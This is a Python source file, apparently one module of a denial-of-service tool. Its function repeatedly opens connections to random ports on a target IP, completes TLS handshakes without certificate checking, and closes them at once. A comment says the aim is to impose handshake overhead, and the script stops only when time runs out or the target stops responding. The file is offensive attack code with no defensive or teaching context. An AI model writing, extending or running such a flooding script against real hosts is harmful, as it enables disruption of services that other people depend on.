import socket
import ssl
import time
import random

def launch(target_ip, ports, duration, tag, stop_event, fail_tracker):
    if not ports:
        print(f"[x] {tag} stopped: no ports to attack on {target_ip}")
        if isinstance(fail_tracker, dict):
            fail_tracker[tag] = True
        else:
            fail_tracker.append(tag)
        return

    start_time = time.time()
    failed = 0

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            print(f"[i] {tag} attack duration ended for {target_ip}")
            break

        port = random.choice(ports)  # pick a random port from the list

        try:
            sock = socket.create_connection((target_ip, port), timeout=3)
            ssock = context.wrap_socket(sock, server_hostname=target_ip)
            # Immediately close to cause overhead in handshake creation
            ssock.close()
        except Exception:
            failed += 1
            if failed > 20:
                print(f"[x] {tag} target seems unresponsive. Stopping attack on {target_ip}")
                if isinstance(fail_tracker, dict):
                    fail_tracker[tag] = True
                else:
                    fail_tracker.append(tag)
                break

        time.sleep(0.2)
